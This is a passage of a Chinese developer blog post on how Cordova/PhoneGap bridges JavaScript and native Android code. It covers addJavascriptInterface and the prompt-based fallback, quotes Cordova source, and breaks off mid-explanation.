<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <title>Cordova学习笔记（二）JS与Android原生交互 | 刘显安的git博客</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="Cordova学习笔记（二）JS与Android原生交互">
<meta property="og:type" content="article">
<meta property="og:title" content="Cordova学习笔记（二）JS与Android原生交互">
<meta property="og:url" content="http://mygit.me/2016/06/30/cordova-note-js-native-bridge-mode/index.html">
<meta property="og:site_name" content="刘显安的git博客">
<meta property="og:description" content="Cordova学习笔记（二）JS与Android原生交互">
<meta property="og:image" content="http://image.liuxianan.com/201607/20160701_154452_690_4135.png">
<meta property="og:updated_time" content="2016-08-23T12:55:59.418Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Cordova学习笔记（二）JS与Android原生交互">
<meta name="twitter:description" content="Cordova学习笔记（二）JS与Android原生交互">
<meta name="twitter:image" content="http://image.liuxianan.com/201607/20160701_154452_690_4135.png">
  
    <link rel="alternative" href="/atom.xml" title="刘显安的git博客" type="application/atom+xml">
  
  
    <link rel="icon" href="//favicon.jpg">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="nullavatar.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">小茗同学</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
						<div class="icon-wrap icon-me hide" data-idx="3">
							<div class="user"></div>
							<div class="shoulder"></div>
						</div>
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>Menu</li>
						<li>Tags</li>
						
						<li>Links</li>
						
						
						<li>About</li>
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="#" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
					        
								<a class="rss" target="_blank" href="#" title="rss">rss</a>
					        
								<a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
					        
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/adb/" style="font-size: 10px;">adb</a> <a href="/tags/alert/" style="font-size: 10px;">alert</a> <a href="/tags/android/" style="font-size: 18.57px;">android</a> <a href="/tags/array/" style="font-size: 12.86px;">array</a> <a href="/tags/bind/" style="font-size: 10px;">bind</a> <a href="/tags/bug/" style="font-size: 11.43px;">bug</a> <a href="/tags/cache/" style="font-size: 10px;">cache</a> <a href="/tags/checkbox/" style="font-size: 10px;">checkbox</a> <a href="/tags/childnodes/" style="font-size: 10px;">childnodes</a> <a href="/tags/children/" style="font-size: 10px;">children</a> <a href="/tags/chrome/" style="font-size: 10px;">chrome</a> <a href="/tags/click/" style="font-size: 11.43px;">click</a> <a href="/tags/code/" style="font-size: 11.43px;">code</a> <a href="/tags/comet4j/" style="font-size: 10px;">comet4j</a> <a href="/tags/console/" style="font-size: 10px;">console</a> <a href="/tags/control/" style="font-size: 10px;">control</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/cordova/" style="font-size: 11.43px;">cordova</a> <a href="/tags/cross/" style="font-size: 10px;">cross</a> <a href="/tags/crossdomain/" style="font-size: 10px;">crossdomain</a> <a href="/tags/css/" style="font-size: 11.43px;">css</a> <a href="/tags/css3/" style="font-size: 11.43px;">css3</a> <a href="/tags/cursor/" style="font-size: 10px;">cursor</a> <a href="/tags/debug/" style="font-size: 10px;">debug</a> <a href="/tags/dns/" style="font-size: 10px;">dns</a> <a href="/tags/dom/" style="font-size: 10px;">dom</a> <a href="/tags/domain/" style="font-size: 10px;">domain</a> <a href="/tags/eclipse/" style="font-size: 12.86px;">eclipse</a> <a href="/tags/el表达式/" style="font-size: 10px;">el表达式</a> <a href="/tags/endswidth/" style="font-size: 10px;">endswidth</a> <a href="/tags/epg/" style="font-size: 10px;">epg</a> <a href="/tags/error/" style="font-size: 10px;">error</a> <a href="/tags/favicon/" style="font-size: 10px;">favicon</a> <a href="/tags/file/" style="font-size: 11.43px;">file</a> <a href="/tags/flash/" style="font-size: 10px;">flash</a> <a href="/tags/for/" style="font-size: 10px;">for</a> <a href="/tags/function/" style="font-size: 10px;">function</a> <a href="/tags/github/" style="font-size: 10px;">github</a> <a href="/tags/hasOwnProperty/" style="font-size: 10px;">hasOwnProperty</a> <a href="/tags/hasownproperty/" style="font-size: 10px;">hasownproperty</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/hoisting/" style="font-size: 10px;">hoisting</a> <a href="/tags/html/" style="font-size: 17.14px;">html</a> <a href="/tags/html5/" style="font-size: 11.43px;">html5</a> <a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/id/" style="font-size: 10px;">id</a> <a href="/tags/in/" style="font-size: 10px;">in</a> <a href="/tags/innerhtml/" style="font-size: 10px;">innerhtml</a> <a href="/tags/input/" style="font-size: 12.86px;">input</a> <a href="/tags/ios/" style="font-size: 10px;">ios</a> <a href="/tags/ip/" style="font-size: 10px;">ip</a> <a href="/tags/isprototypeof/" style="font-size: 10px;">isprototypeof</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/jquery/" style="font-size: 10px;">jquery</a> <a href="/tags/json/" style="font-size: 10px;">json</a> <a href="/tags/lan/" style="font-size: 11.43px;">lan</a> <a href="/tags/linux/" style="font-size: 11.43px;">linux</a> <a href="/tags/log/" style="font-size: 10px;">log</a> <a href="/tags/marquee/" style="font-size: 10px;">marquee</a> <a href="/tags/mime/" style="font-size: 10px;">mime</a> <a href="/tags/mui/" style="font-size: 11.43px;">mui</a> <a href="/tags/mysql/" style="font-size: 11.43px;">mysql</a> <a href="/tags/native/" style="font-size: 10px;">native</a> <a href="/tags/node-js/" style="font-size: 11.43px;">node.js</a> <a href="/tags/npm/" style="font-size: 10px;">npm</a> <a href="/tags/oncreate/" style="font-size: 10px;">oncreate</a> <a href="/tags/phonegap/" style="font-size: 10px;">phonegap</a> <a href="/tags/plugin/" style="font-size: 10px;">plugin</a> <a href="/tags/pomelo/" style="font-size: 10px;">pomelo</a> <a href="/tags/prototype/" style="font-size: 12.86px;">prototype</a> <a href="/tags/pullRefresh/" style="font-size: 10px;">pullRefresh</a> <a href="/tags/shuffle/" style="font-size: 10px;">shuffle</a> <a href="/tags/simple/" style="font-size: 10px;">simple</a> <a href="/tags/socket-io/" style="font-size: 10px;">socket.io</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/startswith/" style="font-size: 10px;">startswith</a> <a href="/tags/status/" style="font-size: 10px;">status</a> <a href="/tags/string/" style="font-size: 10px;">string</a> <a href="/tags/svn/" style="font-size: 10px;">svn</a> <a href="/tags/switch/" style="font-size: 10px;">switch</a> <a href="/tags/textarea/" style="font-size: 10px;">textarea</a> <a href="/tags/tomcat/" style="font-size: 10px;">tomcat</a> <a href="/tags/tomcat6/" style="font-size: 10px;">tomcat6</a> <a href="/tags/tomcat7/" style="font-size: 10px;">tomcat7</a> <a href="/tags/transition/" style="font-size: 10px;">transition</a> <a href="/tags/trim/" style="font-size: 10px;">trim</a> <a href="/tags/type/" style="font-size: 10px;">type</a> <a href="/tags/typeerror/" style="font-size: 10px;">typeerror</a> <a href="/tags/uiwebview/" style="font-size: 10px;">uiwebview</a> <a href="/tags/undefined/" style="font-size: 10px;">undefined</a> <a href="/tags/unicode/" style="font-size: 10px;">unicode</a> <a href="/tags/value/" style="font-size: 10px;">value</a> <a href="/tags/version/" style="font-size: 10px;">version</a> <a href="/tags/video/" style="font-size: 10px;">video</a> <a href="/tags/wan/" style="font-size: 10px;">wan</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/webview/" style="font-size: 15.71px;">webview</a> <a href="/tags/wifi/" style="font-size: 10px;">wifi</a> <a href="/tags/win10/" style="font-size: 10px;">win10</a> <a href="/tags/windows/" style="font-size: 12.86px;">windows</a> <a href="/tags/winscp/" style="font-size: 10px;">winscp</a> <a href="/tags/wlan/" style="font-size: 10px;">wlan</a> <a href="/tags/xshell/" style="font-size: 10px;">xshell</a> <a href="/tags/zoom/" style="font-size: 10px;">zoom</a> <a href="/tags/上下文/" style="font-size: 10px;">上下文</a> <a href="/tags/下拉刷新/" style="font-size: 10px;">下拉刷新</a> <a href="/tags/下载/" style="font-size: 10px;">下载</a> <a href="/tags/不使用/" style="font-size: 10px;">不使用</a> <a href="/tags/不兼容/" style="font-size: 10px;">不兼容</a> <a href="/tags/不同/" style="font-size: 10px;">不同</a> <a href="/tags/不好/" style="font-size: 10px;">不好</a> <a href="/tags/个人/" style="font-size: 10px;">个人</a> <a href="/tags/临时/" style="font-size: 10px;">临时</a> <a href="/tags/乱序/" style="font-size: 10px;">乱序</a> <a href="/tags/云服务器/" style="font-size: 10px;">云服务器</a> <a href="/tags/互动/" style="font-size: 10px;">互动</a> <a href="/tags/交互/" style="font-size: 14.29px;">交互</a> <a href="/tags/交换/" style="font-size: 10px;">交换</a> <a href="/tags/传值/" style="font-size: 11.43px;">传值</a> <a href="/tags/作用域/" style="font-size: 10px;">作用域</a> <a href="/tags/修改/" style="font-size: 10px;">修改</a> <a href="/tags/公告/" style="font-size: 10px;">公告</a> <a href="/tags/关键字/" style="font-size: 10px;">关键字</a> <a href="/tags/兼容性/" style="font-size: 10px;">兼容性</a> <a href="/tags/内网/" style="font-size: 10px;">内网</a> <a href="/tags/切换/" style="font-size: 10px;">切换</a> <a href="/tags/列表/" style="font-size: 10px;">列表</a> <a href="/tags/加载/" style="font-size: 10px;">加载</a> <a href="/tags/匹配/" style="font-size: 10px;">匹配</a> <a href="/tags/区别/" style="font-size: 12.86px;">区别</a> <a href="/tags/单击/" style="font-size: 10px;">单击</a> <a href="/tags/单引号/" style="font-size: 10px;">单引号</a> <a href="/tags/博客/" style="font-size: 10px;">博客</a> <a href="/tags/占用/" style="font-size: 10px;">占用</a> <a href="/tags/原生/" style="font-size: 11.43px;">原生</a> <a href="/tags/变量/" style="font-size: 11.43px;">变量</a> <a href="/tags/变量声明/" style="font-size: 10px;">变量声明</a> <a href="/tags/右键/" style="font-size: 10px;">右键</a> <a href="/tags/后台/" style="font-size: 10px;">后台</a> <a href="/tags/吐槽/" style="font-size: 10px;">吐槽</a> <a href="/tags/命令/" style="font-size: 11.43px;">命令</a> <a href="/tags/图标/" style="font-size: 10px;">图标</a> <a href="/tags/地址/" style="font-size: 10px;">地址</a> <a href="/tags/域名/" style="font-size: 10px;">域名</a> <a href="/tags/基本/" style="font-size: 10px;">基本</a> <a href="/tags/处理/" style="font-size: 11.43px;">处理</a> <a href="/tags/复制/" style="font-size: 10px;">复制</a> <a href="/tags/复选框/" style="font-size: 10px;">复选框</a> <a href="/tags/失效/" style="font-size: 10px;">失效</a> <a href="/tags/失败/" style="font-size: 10px;">失败</a> <a href="/tags/字符/" style="font-size: 11.43px;">字符</a> <a href="/tags/安卓/" style="font-size: 10px;">安卓</a> <a href="/tags/安装/" style="font-size: 10px;">安装</a> <a href="/tags/实时/" style="font-size: 10px;">实时</a> <a href="/tags/局域网/" style="font-size: 10px;">局域网</a> <a href="/tags/展示/" style="font-size: 10px;">展示</a> <a href="/tags/工具/" style="font-size: 10px;">工具</a> <a href="/tags/常用/" style="font-size: 10px;">常用</a> <a href="/tags/常见/" style="font-size: 11.43px;">常见</a> <a href="/tags/异步/" style="font-size: 10px;">异步</a> <a href="/tags/总结/" style="font-size: 11.43px;">总结</a> <a href="/tags/手机/" style="font-size: 10px;">手机</a> <a href="/tags/打乱/" style="font-size: 10px;">打乱</a> <a href="/tags/执行中/" style="font-size: 10px;">执行中</a> <a href="/tags/抢注/" style="font-size: 10px;">抢注</a> <a href="/tags/报错/" style="font-size: 10px;">报错</a> <a href="/tags/指针/" style="font-size: 10px;">指针</a> <a href="/tags/按钮/" style="font-size: 10px;">按钮</a> <a href="/tags/控制/" style="font-size: 10px;">控制</a> <a href="/tags/推送/" style="font-size: 10px;">推送</a> <a href="/tags/提升/" style="font-size: 10px;">提升</a> <a href="/tags/插入/" style="font-size: 10px;">插入</a> <a href="/tags/搭建/" style="font-size: 10px;">搭建</a> <a href="/tags/数组/" style="font-size: 12.86px;">数组</a> <a href="/tags/文件上传/" style="font-size: 10px;">文件上传</a> <a href="/tags/方法/" style="font-size: 11.43px;">方法</a> <a href="/tags/最全/" style="font-size: 10px;">最全</a> <a href="/tags/未运行/" style="font-size: 10px;">未运行</a> <a href="/tags/本地/" style="font-size: 10px;">本地</a> <a href="/tags/查看/" style="font-size: 10px;">查看</a> <a href="/tags/样式/" style="font-size: 11.43px;">样式</a> <a href="/tags/横屏/" style="font-size: 10px;">横屏</a> <a href="/tags/正则/" style="font-size: 10px;">正则</a> <a href="/tags/注解/" style="font-size: 10px;">注解</a> <a href="/tags/清理/" style="font-size: 10px;">清理</a> <a href="/tags/清除/" style="font-size: 10px;">清除</a> <a href="/tags/版本号/" style="font-size: 10px;">版本号</a> <a href="/tags/特殊/" style="font-size: 10px;">特殊</a> <a href="/tags/状态码/" style="font-size: 10px;">状态码</a> <a href="/tags/生成/" style="font-size: 11.43px;">生成</a> <a href="/tags/目录/" style="font-size: 10px;">目录</a> <a href="/tags/破解/" style="font-size: 10px;">破解</a> <a href="/tags/禁止/" style="font-size: 10px;">禁止</a> <a href="/tags/移动端/" style="font-size: 11.43px;">移动端</a> <a href="/tags/竖屏/" style="font-size: 10px;">竖屏</a> <a href="/tags/端口/" style="font-size: 10px;">端口</a> <a href="/tags/笔记/" style="font-size: 10px;">笔记</a> <a href="/tags/粘贴/" style="font-size: 10px;">粘贴</a> <a href="/tags/缓存/" style="font-size: 11.43px;">缓存</a> <a href="/tags/编码/" style="font-size: 10px;">编码</a> <a href="/tags/网站/" style="font-size: 11.43px;">网站</a> <a href="/tags/网页/" style="font-size: 11.43px;">网页</a> <a href="/tags/脑残/" style="font-size: 10px;">脑残</a> <a href="/tags/自动/" style="font-size: 11.43px;">自动</a> <a href="/tags/自定义/" style="font-size: 11.43px;">自定义</a> <a href="/tags/获取/" style="font-size: 11.43px;">获取</a> <a href="/tags/表达式/" style="font-size: 10px;">表达式</a> <a href="/tags/视频/" style="font-size: 10px;">视频</a> <a href="/tags/解析/" style="font-size: 10px;">解析</a> <a href="/tags/触发/" style="font-size: 10px;">触发</a> <a href="/tags/计数器/" style="font-size: 10px;">计数器</a> <a href="/tags/设置/" style="font-size: 11.43px;">设置</a> <a href="/tags/详解/" style="font-size: 10px;">详解</a> <a href="/tags/调试/" style="font-size: 10px;">调试</a> <a href="/tags/购买/" style="font-size: 10px;">购买</a> <a href="/tags/跨域/" style="font-size: 11.43px;">跨域</a> <a href="/tags/转码/" style="font-size: 10px;">转码</a> <a href="/tags/运行/" style="font-size: 10px;">运行</a> <a href="/tags/运行中/" style="font-size: 10px;">运行中</a> <a href="/tags/连接/" style="font-size: 10px;">连接</a> <a href="/tags/遍历/" style="font-size: 10px;">遍历</a> <a href="/tags/阿里云/" style="font-size: 10px;">阿里云</a> <a href="/tags/非字符串/" style="font-size: 10px;">非字符串</a> <a href="/tags/音频服务/" style="font-size: 10px;">音频服务</a> <a href="/tags/默认/" style="font-size: 10px;">默认</a> <a href="/tags/鼠标/" style="font-size: 10px;">鼠标</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://liuxianan.com">我的个人网站</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/liuxianan/">我的博客园</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">屌丝程序员一枚，个人网站：http://liuxianan.com</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>

    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">小茗同学</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				
					<img lazy-src="nullavatar.jpg" class="js-avatar">
				
			</div>
			<hgroup>
			  <h1 class="header-author">小茗同学</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="#" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
			        
						<a class="rss" target="_blank" href="#" title="rss">rss</a>
			        
						<a class="zhihu" target="_blank" href="#" title="zhihu">zhihu</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>

      <div class="body-wrap"><article id="post-cordova-note-js-native-bridge-mode" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2016/06/30/cordova-note-js-native-bridge-mode/" class="article-date">
  	<time datetime="2016-06-29T16:00:00.000Z" itemprop="datePublished">2016-06-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      Cordova学习笔记（二）JS与Android原生交互
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/android/">android</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cordova/">cordova</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/javascript/">javascript</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/native/">native</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/phonegap/">phonegap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/交互/">交互</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原生/">原生</a></li></ul>
	</div>

        
	<div class="article-category tagcloud">
	<a class="article-category-link" href="/categories/hybird/">hybird</a>
	</div>


        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>[TOC]</p>
<h1 id="常规做法"><a href="#常规做法" class="headerlink" title="常规做法"></a>常规做法</h1><p>先来说一下我们常规的JS与原生交互的实现方式。</p>
<p>//TODO 这里还有待完善</p>
<h2 id="js调用原生"><a href="#js调用原生" class="headerlink" title="js调用原生"></a>js调用原生</h2><p>通过给方法添加<code>@JavascriptInterface</code>注解，然后通过<code>mWebView.addJavascriptInterface(object, name)</code>将刚才那个方法所在的类注入JS，然后js就可以直接通过<code>name.方法名()</code>来调用刚才那个方法。</p>
<p>几个要点：</p>
<ol>
<li>这个方法是同步的，可以直接返回值给js；</li>
<li>不支持重载，也 <a id="more"></a> 就是说<code>foo(String a)</code>和<code>foo(String a, String b)</code> //TODO</li>
<li>支持一些简单的js与原生数据转换；</li>
<li>只需要对webview全局注入一次，无需针对每个页面重新注入；</li>
<li>对iframe的支持不同版本Android不一样，有的会注入到iframe里面，有的不会；</li>
<li>Android4.2开始才增加<code>@JavascriptInterface</code>注解，目的是为了解决一个<a href="http://www.wooyun.org/bugs/wooyun-2010-036131/auth/3488a336fe230cb6928cf2444a53663f" target="_blank" rel="external">漏洞</a>，在此之后，只有添加了这个注解的方法才会被注入JS。</li>
</ol>
<h2 id="原生调用js"><a href="#原生调用js" class="headerlink" title="原生调用js"></a>原生调用js</h2><p>一般都是通过<code>mWebView.loadUrl(&#39;javascript:xxx&#39;)</code>来执行一段JS，据说这个方法有一个bug，就是执行的时候如果输入法是弹出的，执行后输入法会自动消失，我暂未亲测。</p>
<p>这个方法最大的缺点是无法优雅的解决异步回调问题，鉴于此，Android4.4开始增加了如下方法：</p>
<pre><code>mWebView.evaluateJavascript(script, resultCallback)
</code></pre><p>有了这个方法就可以非常方便的实现js的异步回调，但是毕竟低于Android4.4的版本还是有比较大的份额，所以一般还是得自己另行解决异步回调的问题。</p>
<h1 id="Cordova-PhoneGap的实现方式"><a href="#Cordova-PhoneGap的实现方式" class="headerlink" title="Cordova/PhoneGap的实现方式"></a>Cordova/PhoneGap的实现方式</h1><h2 id="JS调用原生"><a href="#JS调用原生" class="headerlink" title="JS调用原生"></a>JS调用原生</h2><p>这里不作特别细致的源码分析，只是大概走一下整个流程。我们这里以调用摄像头拍照为例分析一下整个过程。</p>
<p>调用摄像头拍照有2个方法，一个<code>navigator.device.capture.captureImage</code>，一个是<code>navigator.camera.getPicture</code>，我们这里以前面一个方法为例。</p>
<p>我们从如下代码开始调用：</p>
<pre><code>navigator.device.capture.captureImage(function(mediaFiles)
{
    console.log(mediaFiles);
});
</code></pre><p>然后进入capture.js：</p>
<pre><code>Capture.prototype.captureImage = function(successCallback, errorCallback, options){
    _capture(&quot;captureImage&quot;, successCallback, errorCallback, options);
};
</code></pre><p>然后进入cordova.js中的：</p>
<pre><code>androidExec(success, fail, service, action, args)
</code></pre><p>这里面有一个jsToNativeBridgeMode，cordova的jsToNative有2种实现方式：</p>
<pre><code>jsToNativeModes = {
    PROMPT: 0, // 采用prompt实现
    JS_OBJECT: 1 // 采用传统的 addJavaScriptInterface 实现
},
</code></pre><p>默认采用<code>addJavaScriptInterface</code>方式，也就是这里所说的<code>JS_OBJECT</code>，如果不存在<code>window._cordovaNative</code>对象，则采用prompt方式替代，那么这里的<code>window._cordovaNative</code>又是从哪里来的呢？</p>
<p>在<code>CordovaLib</code>项目中的<code>SystemWebViewEngine.java</code>文件中有这样一个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exposeJsInterface</span><span class="params">(WebView webView, CordovaBridge bridge)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> ((Build.VERSION.SDK_INT &lt; Build.VERSION_CODES.JELLY_BEAN_MR1)) &#123;</div><div class="line">        Log.i(TAG, <span class="string">"Disabled addJavascriptInterface() bridge since Android version is old."</span>);</div><div class="line">        <span class="comment">// Bug being that Java Strings do not get converted to JS strings automatically.</span></div><div class="line">        <span class="comment">// This isn't hard to work-around on the JS side, but it's easier to just</span></div><div class="line">        <span class="comment">// use the prompt bridge instead.</span></div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    SystemExposedJsApi exposedJsApi = <span class="keyword">new</span> SystemExposedJsApi(bridge);</div><div class="line">    webView.addJavascriptInterface(exposedJsApi, <span class="string">"_cordovaNative"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>其含义是，如果当前Android版本&gt;=4.2，那么直接采用Android原生提供的<code>addJavaScriptInterface</code>方法来注入一个名叫<code>SystemExposedJsApi</code>的对象，否则不作任何处理（只弹了一个提示），为什么这么做呢？注释里面是说“由于Java的String不会自动转换成js的string，虽然在js端比较容易处理，但是采用prompt方式替代更容易”，我觉得还有另外一个原因，就是4.2之前存在的那个注入漏洞。</p>
<p>这个<code>SystemExposedJsApi</code>类仅仅只注入了3个方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@JavascriptInterface</span></div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">exec</span><span class="params">(<span class="keyword">int</span> bridgeSecret, String service, String action, String callbackId, String arguments)</span> <span class="keyword">throws</span> JSONException, IllegalAccessException </span>&#123;</div><div class="line">    <span class="keyword">return</span> bridge.jsExec(bridgeSecret, service, action, callbackId, arguments);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">@JavascriptInterface</span></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNativeToJsBridgeMode</span><span class="params">(<span class="keyword">int</span> bridgeSecret, <span class="keyword">int</span> value)</span> <span class="keyword">throws</span> IllegalAccessException </span>&#123;</div><div class="line">    bridge.jsSetNativeToJsBridgeMode(bridgeSecret, value);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">@JavascriptInterface</span></div><div class="line"><span class="function"><span class="keyword">public</span> String <span class="title">retrieveJsMessages</span><span class="params">(<span class="keyword">int</span> bridgeSecret, <span class="keyword">boolean</span> fromOnlineEvent)</span> <span class="keyword">throws</span> IllegalAccessException </span>&#123;</div><div class="line">    <span class="keyword">return</span> bridge.jsRetrieveJsMessages(bridgeSecret, fromOnlineEvent);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这3个方法最终都是调用<code>CordovaBridge</code>对应的方法，分别是：</p>
<ul>
<li>exec 执行，几乎所有方法的执行都是都过这个方法</li>
<li>setNativeToJsBridgeMode 设置原生调用JS的桥接模式</li>
<li>retrieveJsMessages 从原生获取JS消息</li>
</ul>
<p>好了，说了一大通再回到刚开始那里，如果是采用prompt方式呢？</p>
<p>在cordova.js中找到如下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">define(<span class="string">"cordova/android/promptbasednativeapi"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">require, exports, module</span>) </span>&#123;</div><div class="line"><span class="comment">/**</span></div><div class="line"> * 实现ExposedJsApi.java的API，但是采用prompt()实现</div><div class="line"> */</div><div class="line"><span class="built_in">module</span>.exports = &#123;</div><div class="line">    exec: <span class="function"><span class="keyword">function</span>(<span class="params">bridgeSecret, service, action, callbackId, argsJson</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> prompt(argsJson, <span class="string">'gap:'</span>+<span class="built_in">JSON</span>.stringify([bridgeSecret, service, action, callbackId]));</div><div class="line">    &#125;,</div><div class="line">    setNativeToJsBridgeMode: <span class="function"><span class="keyword">function</span>(<span class="params">bridgeSecret, value</span>) </span>&#123;</div><div class="line">        prompt(value, <span class="string">'gap_bridge_mode:'</span> + bridgeSecret);</div><div class="line">    &#125;,</div><div class="line">    retrieveJsMessages: <span class="function"><span class="keyword">function</span>(<span class="params">bridgeSecret, fromOnlineEvent</span>) </span>&#123;</div><div class="line">        <span class="keyword">return</span> prompt(+fromOnlineEvent, <span class="string">'gap_poll:'</span> + bridgeSecret);</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>可以看到，<code>promptbasednativeapi</code>提供了和<code>ExposedJsApi.java</code>一模一样的3个方法，只不过调用的都是prompt方法，然后我们在Android端的<code>SystemWebChromeClient</code>找到如下方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onJsPrompt</span><span class="params">(WebView view, String origin, String message, String defaultValue, <span class="keyword">final</span> JsPromptResult result)</span> </span>&#123;</div><div class="line">	<span class="comment">// 不像@JavascriptInterface方式，prompt调用总是在UI线程</span></div><div class="line">    String handledRet = parentEngine.bridge.promptOnJsPrompt(origin, message, defaultValue);</div><div class="line">    <span class="keyword">if</span> (handledRet != <span class="keyword">null</span>) <span class="comment">// 只要返回不是null，就认为是特殊的prompt消息</span></div><div class="line">	&#123;</div><div class="line">        result.confirm(handledRet);</div><div class="line">    &#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">        <span class="comment">//正常的prompt处理</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>CordovaBridge.promptOnJsPrompt</code>最终也还是和<code>SystemExposedJsApi</code>一样，调用的那3个方法，所以，至此可以发现，无论哪种bridgeMode最终调用的方法是一样的。</p>
<p>回到<code>androidExec</code>方法：</p>
